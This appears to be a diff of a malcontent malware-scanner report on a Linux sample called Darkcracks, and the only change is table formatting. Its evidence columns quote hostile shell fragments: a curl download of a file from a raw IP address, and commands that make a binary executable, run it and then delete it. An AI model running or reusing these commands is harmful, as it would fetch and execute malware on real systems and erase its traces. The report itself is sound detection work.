@@ -1,7 +1,7 @@
 ## linux/2024.Darkcracks/darkcracks.sh [😈 CRITICAL]
 
 | RISK | KEY | DESCRIPTION | EVIDENCE |
-|:--:|:--:|:--:|:--:|
+|:--|:--|:--|:--|
 | CRITICAL | [evasion/file/location/chdir_unusual](https://github.com/chainguard-dev/malcontent/blob/main/rules/evasion/file/location/chdir-unusual.yara#cd_val_obsessive) | changes directory to multiple unusual locations | [cd /root](https://github.com/search?q=cd+%2Froot&type=code)<br>[cd /mnt](https://github.com/search?q=cd+%2Fmnt&type=code)<br>[cd /tmp](https://github.com/search?q=cd+%2Ftmp&type=code)<br>[cd /;](https://github.com/search?q=cd+%2F%3B&type=code) |
 | CRITICAL | [evasion/self_deletion/run_and_delete](https://github.com/chainguard-dev/malcontent/blob/main/rules/evasion/self_deletion/run_and_delete.yara#run_sleep_delete) | run executable, sleep, and delete | [chmod +x ./wdvsh](https://github.com/search?q=chmod+%2Bx+.%2Fwdvsh&type=code)<br>[./wdvsh agr](https://github.com/search?q=.%2Fwdvsh+agr&type=code)<br>[rm ./wdvsh](https://github.com/search?q=rm+.%2Fwdvsh&type=code)<br>[rm ./agr](https://github.com/search?q=rm+.%2Fagr&type=code)<br>[sleep 3](https://github.com/search?q=sleep+3&type=code) |
 | CRITICAL | [net/download/fetch](https://github.com/chainguard-dev/malcontent/blob/main/rules/net/download/fetch.yara#curl_download_ip) | Invokes curl to download a file from an IP | [curl http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/j8UgL3v -o](https://github.com/search?q=curl+http%3A%2F%2F179.191.68.85%3A82%2Fvendor%2Fsebastian%2Fdiff%2Fsrc%2FException%2Fj8UgL3v+-o&type=code) |
